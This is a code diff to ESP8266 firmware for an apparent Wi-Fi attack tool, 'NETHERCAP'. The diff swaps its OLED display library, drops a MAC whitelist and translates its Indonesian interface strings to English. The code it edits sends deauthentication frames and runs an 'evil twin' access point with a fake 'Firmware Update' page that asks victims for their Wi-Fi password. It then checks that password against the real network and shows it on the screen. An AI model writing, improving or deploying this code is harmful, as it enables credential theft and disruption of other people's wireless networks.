@@ -3,22 +3,18 @@
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
 #include <Wire.h>
-#include <Adafruit_GFX.h>
-#include <Adafruit_SSD1306.h>
+#include "SSD1306Wire.h" // Library baru yang lebih ringan
 
 extern "C" {
 #include "user_interface.h"
-// Wajib agar fungsi deauth tidak error di SDK 2.0.0
 int wifi_send_pkt_freedom(uint8* buf, int len, bool sys_seq);
 }
 
-// Konfigurasi OLED 0.66" (64x48)
-#define SCREEN_WIDTH 64
-#define SCREEN_HEIGHT 48
-#define OLED_RESET    -1
-Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
+// Inisialisasi OLED 64x48 pada alamat 0x3c
+// SDA = D2 (GPIO4), SCL = D1 (GPIO5)
+SSD1306Wire display(0x3c, 4, 5, GEOMETRY_64_48);
 
-#define LED_PIN 2 // LED Internal untuk fitur Blink
+#define LED_PIN 2
 
 typedef struct {
   String ssid;
@@ -33,7 +29,6 @@ ESP8266WebServer webServer(80);
 
 _Network _networks[16];
 _Network _selectedNetwork;
-String _whitelistMAC = ""; 
 String _correct = "";
 String _tryPassword = "";
 bool hotspot_active = false;
@@ -41,17 +36,14 @@ bool deauthing_active = false;
 unsigned long now = 0;
 unsigned long deauth_now = 0;
 
-// Update Tampilan OLED ala Nethercap
-void updateOLED(String msg1, String msg2 = "") {
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0,0);
-  display.println("NETHERCAP");
-  display.println("---------");
-  display.println(msg1);
-  if(msg2 != "") display.println(msg2);
-  if(deauthing_active) display.println("ATTACK!");
+void updateOLED(String m1, String m2 = "") {
+  display.clear();
+  display.setFont(ArialMT_Plain_10);
+  display.setTextAlignment(TEXT_ALIGN_LEFT);
+  display.drawString(0, 0, "NETHERCAP");
+  display.drawString(0, 12, "---------");
+  display.drawString(0, 24, m1);
+  if (m2 != "") display.drawString(0, 34, m2);
   display.display();
 }
 
@@ -78,23 +70,22 @@ void performScan() {
 
 void handleResult() {
   if (WiFi.status() != WL_CONNECTED) {
-    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#000;color:red;text-align:center;font-family:sans-serif;}</style></head><body><h1>GAGAL</h1><p>Password Salah.</p><a href='/'>Ulangi</a></body></html>");
-    updateOLED("WRONG PW");
+    webServer.send(200, "text/html", "<html><body style='background:#000;color:red;'><h1>FAILED</h1></body></html>");
+    updateOLED("WRONG PASS");
   } else {
-    _correct = "PW: " + _tryPassword;
+    _correct = "PASS: " + _tryPassword;
     hotspot_active = deauthing_active = false;
     updateOLED("FOUND!", _tryPassword);
-    webServer.send(200, "text/html", "<html><body style='background:#000;color:#0f0;text-align:center;'><h1>BERHASIL</h1><p>Password disimpan.</p></body></html>");
+    webServer.send(200, "text/html", "<html><body style='background:#000;color:green;'><h1>SUCCESS</h1></body></html>");
   }
 }
 
 void handleIndex() {
-  if (webServer.hasArg("wl")) _whitelistMAC = webServer.arg("wl");
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
       if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
         _selectedNetwork = _networks[i];
-        updateOLED("TARGET:", _selectedNetwork.ssid);
+        updateOLED("SEL:", _selectedNetwork.ssid);
       }
     }
   }
@@ -119,7 +110,6 @@ void handleIndex() {
     html += "<h3>NETHERCAP v3.8.3</h3>";
     html += "<a class='btn' href='/?deauth=" + String(deauthing_active ? "stop" : "start") + "'>" + String(deauthing_active ? "STOP DEAUTH" : "START DEAUTH") + "</a>";
     html += "<a class='btn' href='/?hotspot=start'>EVIL TWIN</a><br><br>";
-    if(_correct != "") html += "<b>" + _correct + "</b><br>";
     html += "<table>";
     for (int i = 0; i < 16; i++) {
       if (_networks[i].ssid == "") break;
@@ -132,9 +122,9 @@ void handleIndex() {
       _tryPassword = webServer.arg("password");
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='10;url=/result'></head><body>Verifikasi...</body></html>");
+      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='10;url=/result'></head><body>Checking...</body></html>");
     } else {
-      webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'></head><body><h3>Update Firmware</h3><p>Masukkan Password WiFi " + _selectedNetwork.ssid + "</p><form action='/'><input type='password' name='password'><input type='submit' value='UPDATE'></form></body></html>");
+      webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'></head><body><h3>Firmware Update</h3><p>SSID: " + _selectedNetwork.ssid + "</p><form><input type='password' name='password'><input type='submit' value='UPDATE'></form></body></html>");
     }
   }
 }
@@ -142,8 +132,10 @@ void handleIndex() {
 void setup() {
   Serial.begin(115200);
   pinMode(LED_PIN, OUTPUT);
-  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { for(;;); }
+  display.init();
+  display.flipScreenVertically();
   updateOLED("READY");
+  
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
